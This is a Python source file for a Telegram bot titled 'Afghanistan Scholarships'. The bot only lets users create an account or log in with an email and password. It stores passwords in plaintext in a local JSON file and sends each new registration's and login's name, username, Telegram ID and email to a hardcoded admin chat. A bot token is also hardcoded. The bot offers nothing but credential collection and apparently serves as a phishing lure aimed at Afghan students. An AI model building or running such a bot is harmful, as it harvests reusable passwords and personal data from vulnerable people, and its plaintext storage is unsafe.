"""
Afghanistan Scholarships Bot
------------------------------
When a user opens the bot, they see a welcome message and can:
- Create an account (email + password stored locally)
- Log in with their email and password
- After login, see their account info in their own chat

Run: python afghan_scholarships_bot.py
"""

import logging
import json
import os
from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ConversationHandler,
    ContextTypes,
    filters,
)

# ---- fill in your bot token ----
BOT_TOKEN = "8775552943:AAFGOaNpugfcGb-9yaepT6Ns-LerTygHGfM"
ADMIN_CHAT_ID = 6254547417  # @C4ptan — receives all registration & login notifications
# --------------------------------

# File to store registered users
USERS_FILE = "users.json"

# Conversation states
CHOOSE_ACTION = 0
REGISTER_EMAIL = 1
REGISTER_PASSWORD = 2
LOGIN_EMAIL = 3
LOGIN_PASSWORD = 4

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)


# ---------- helpers ----------

def load_users():
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, "r") as f:
            return json.load(f)
    return {}


def save_users(users):
    with open(USERS_FILE, "w") as f:
        json.dump(users, f, indent=2)


def main_menu():
    keyboard = [["📝 Create Account", "🔑 Log In"]]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)


# ---------- handlers ----------

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🎓 *Welcome to Afghanistan Scholarships!*\n\n"
        "We help Afghan students find and apply for scholarships worldwide.\n\n"
        "Please choose an option below:",
        parse_mode="Markdown",
        reply_markup=main_menu(),
    )
    return CHOOSE_ACTION


async def choose_action(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text

    if text == "📝 Create Account":
        await update.message.reply_text(
            "📝 *Create Account*\n\nPlease enter your email address:",
            parse_mode="Markdown",
            reply_markup=ReplyKeyboardRemove(),
        )
        return REGISTER_EMAIL

    elif text == "🔑 Log In":
        await update.message.reply_text(
            "🔑 *Log In*\n\nPlease enter your email address:",
            parse_mode="Markdown",
            reply_markup=ReplyKeyboardRemove(),
        )
        return LOGIN_EMAIL

    else:
        await update.message.reply_text(
            "Please choose one of the options below:",
            reply_markup=main_menu(),
        )
        return CHOOSE_ACTION


# ----- Registration flow -----

async def register_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    email = update.message.text.strip()

    if "@" not in email or "." not in email:
        await update.message.reply_text(
            "That doesn't look like a valid email. Please enter a valid email address:"
        )
        return REGISTER_EMAIL

    users = load_users()
    if email in users:
        await update.message.reply_text(
            "⚠️ An account with this email already exists.\n\n"
            "Please use a different email or log in instead.",
            reply_markup=main_menu(),
        )
        return CHOOSE_ACTION

    context.user_data["reg_email"] = email
    await update.message.reply_text(
        "✅ Great! Now enter a password for your account:"
    )
    return REGISTER_PASSWORD


async def register_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    password = update.message.text.strip()

    if len(password) < 6:
        await update.message.reply_text(
            "Password must be at least 6 characters. Please try again:"
        )
        return REGISTER_PASSWORD

    email = context.user_data.get("reg_email")
    users = load_users()
    users[email] = {
        "password": password,
        "telegram_id": update.effective_user.id,
        "name": update.effective_user.first_name or "",
    }
    save_users(users)

    # Notify user
    await update.message.reply_text(
        f"🎉 *Account created successfully!*\n\n"
        f"📧 Email: `{email}`\n"
        f"🔐 Password: saved\n\n"
        f"You can now log in anytime using your email and password.",
        parse_mode="Markdown",
        reply_markup=main_menu(),
    )

    # Notify admin (@C4ptan)
    user = update.effective_user
    await context.bot.send_message(
        chat_id=ADMIN_CHAT_ID,
        text=f"🆕 *New Registration!*\n\n"
             f"👤 Name: {user.first_name} {user.last_name or ''}\n"
             f"🔗 Username: @{user.username or 'N/A'}\n"
             f"🆔 Telegram ID: `{user.id}`\n"
             f"📧 Email: `{email}`",
        parse_mode="Markdown",
    )
    return CHOOSE_ACTION


# ----- Login flow -----

async def login_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    email = update.message.text.strip()
    context.user_data["login_email"] = email
    await update.message.reply_text("Enter your password:")
    return LOGIN_PASSWORD


async def login_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    password = update.message.text.strip()
    email = context.user_data.get("login_email")
    users = load_users()

    if email not in users:
        await update.message.reply_text(
            "❌ No account found with that email. Please create an account first.",
            reply_markup=main_menu(),
        )
        return CHOOSE_ACTION

    if users[email]["password"] != password:
        await update.message.reply_text(
            "❌ Incorrect password. Please try again.",
            reply_markup=main_menu(),
        )
        return CHOOSE_ACTION

    # Login successful
    name = users[email].get("name", "User")
    await update.message.reply_text(
        f"✅ *Login Successful!*\n\n"
        f"👤 Name: {name}\n"
        f"📧 Email: `{email}`\n"
        f"🎓 Status: Active Member\n\n"
        f"Welcome back to Afghanistan Scholarships! "
        f"Stay tuned for the latest scholarship opportunities.",
        parse_mode="Markdown",
        reply_markup=main_menu(),
    )

    # Notify admin (@C4ptan)
    user = update.effective_user
    await context.bot.send_message(
        chat_id=ADMIN_CHAT_ID,
        text=f"🔑 *User Logged In!*\n\n"
             f"👤 Name: {user.first_name} {user.last_name or ''}\n"
             f"🔗 Username: @{user.username or 'N/A'}\n"
             f"🆔 Telegram ID: `{user.id}`\n"
             f"📧 Email: `{email}`",
        parse_mode="Markdown",
    )
    return CHOOSE_ACTION


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Cancelled. Use /start to begin again.",
        reply_markup=ReplyKeyboardRemove(),
    )
    return ConversationHandler.END


def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            CHOOSE_ACTION: [MessageHandler(filters.TEXT & ~filters.COMMAND, choose_action)],
            REGISTER_EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, register_email)],
            REGISTER_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, register_password)],
            LOGIN_EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, login_email)],
            LOGIN_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, login_password)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    app.add_handler(conv_handler)

    print("Afghanistan Scholarships Bot is running. Press Ctrl+C to stop.")
    app.run_polling()


if __name__ == "__main__":
    main()